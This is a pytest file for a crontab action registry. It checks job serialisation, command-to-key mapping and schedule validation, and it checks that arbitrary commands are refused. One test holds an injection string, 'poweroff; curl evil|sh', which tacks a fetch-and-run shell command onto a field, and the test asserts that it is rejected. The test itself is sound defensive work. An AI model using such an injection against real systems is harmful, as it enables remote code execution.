"""
Tests for the timer action registry (SCREEN-CONTROL-PLAN.md step 2, already
implemented and separately verified end to end against a real root crontab on
unitotem-test - see the step-2 commit message). These are the pure in-memory
regression tests: no file is ever written, `crontab.CronTab(tab=...)` builds
an in-memory representation from a string and `.write()` is never called.
"""
import pytest
from crontab import CronTab

from api.system.cron import _schedule_error
from utils.system.crontab import ACTIONS, UniCron


def make_tab(text: str) -> UniCron:
    tab = CronTab(tab=text)
    tab.__class__ = UniCron   # reuse UniCron's methods on an in-memory tab
    return tab


# ── the bug this whole feature needed fixed ─────────────────────────────────

def test_serialize_does_not_raise_on_wildcards():
    # This exact job - "every day at 22:00", day-of-month/month/day-of-week
    # all '*' - used to raise ValueError from int(str(job.dom)) and take the
    # WHOLE job list down with it. This is the regression test.
    tab = make_tab('0 22 * * * /usr/sbin/poweroff # unitotem:-)aabbccdd\n')
    jobs = tab.serialize()
    assert len(jobs) == 1
    job = jobs[0]
    assert job['minute'] == '0'
    assert job['hour'] == '22'
    assert job['dayOfMonth'] == '*'
    assert job['month'] == '*'
    assert job['dayOfWeek'] == '*'


def test_serialize_preserves_step_and_range_slices():
    tab = make_tab(
        '*/15 * * * * /usr/sbin/reboot # unitotem:-)11223344\n'
        '30 6 1-5 1 1 /usr/sbin/poweroff # unitotem:-)deadbeef\n'
    )
    jobs = tab.serialize()
    by_uuid = {j['uuid']: j for j in jobs}
    assert by_uuid['11223344']['minute'] == '*/15'
    assert by_uuid['deadbeef']['dayOfMonth'] == '1-5'


# ── command <-> action key mapping ──────────────────────────────────────────

def test_serialize_maps_command_back_to_action_key():
    tab = make_tab('0 22 * * * /usr/sbin/poweroff # unitotem:-)aabbccdd\n')
    job = tab.serialize()[0]
    assert job['command'] == 'pwr'
    assert job['known'] is True


def test_serialize_reports_foreign_command_as_is_and_not_known():
    # A job this version did not write (or a future version wrote with a
    # command not yet in ACTIONS) must be reported honestly, not silently
    # mapped onto one of ours.
    tab = make_tab('0 0 * * * /usr/bin/something-else # unitotem:-)cafe0000\n')
    job = tab.serialize()[0]
    assert job['command'] == '/usr/bin/something-else'
    assert job['known'] is False


def test_serialize_only_lists_our_own_jobs():
    # A job in the crontab with no unitotem:-) comment at all must not appear -
    # this crontab is root's, and other things may legitimately live in it.
    tab = make_tab(
        '0 22 * * * /usr/sbin/poweroff # unitotem:-)aabbccdd\n'
        '0 3 * * * /usr/sbin/poweroff\n'
    )
    assert len(tab.serialize()) == 1


# ── new() refuses anything not in the registry ──────────────────────────────

def test_new_refuses_free_form_command():
    tab = make_tab('')
    # The whole point of the registry: a request cannot smuggle an arbitrary
    # command into root's crontab, which cron hands straight to /bin/sh.
    assert tab.new('poweroff; curl evil|sh', '0', '1', '*', '*', '*') is False
    assert tab.serialize() == []


def test_new_refuses_empty_and_unknown_keys():
    tab = make_tab('')
    assert tab.new('', '0', '1', '*', '*', '*') is False
    assert tab.new('nope', '0', '1', '*', '*', '*') is False
    assert tab.serialize() == []


def test_new_accepts_a_registry_key_and_looks_up_the_real_command():
    tab = make_tab('')
    assert tab.new('pwr', '0', '22', '*', '*', '*') is True
    jobs = tab.serialize()
    assert len(jobs) == 1
    assert jobs[0]['command'] == 'pwr'
    # The path itself is never user-controlled - confirm it resolved to the
    # looked-up absolute path, not to anything derived from the request.
    raw_commands = [j.command for j in tab.findById()]
    assert raw_commands == [ACTIONS['pwr']]


# ── schedule validation (api.system.cron._schedule_error) ──────────────────

@pytest.mark.parametrize('minute,hour,dom,month,dow', [
    ('0', '22', '*', '*', '*'),
    ('*/15', '*', '*', '*', '*'),
    ('1-5', '*', '*', '*', '*'),
    ('0,30', '*', '*', '*', '*'),
])
def test_schedule_error_none_for_valid_schedules(minute, hour, dom, month, dow):
    assert _schedule_error(minute, hour, dom, month, dow) is None


@pytest.mark.parametrize('minute', ['nope', '99', '60'])
def test_schedule_error_set_for_invalid_schedules(minute):
    assert _schedule_error(minute, '*', '*', '*', '*') is not None


def test_schedule_error_none_means_leave_the_schedule_alone():
    # All-None is editJob's "don't touch the schedule" signal, not "empty
    # schedule" - must not be flagged as invalid.
    assert _schedule_error(None, None, None, None, None) is None


def test_schedule_error_accepts_ints_from_older_clients():
    assert _schedule_error(0, 22, '*', '*', '*') is None
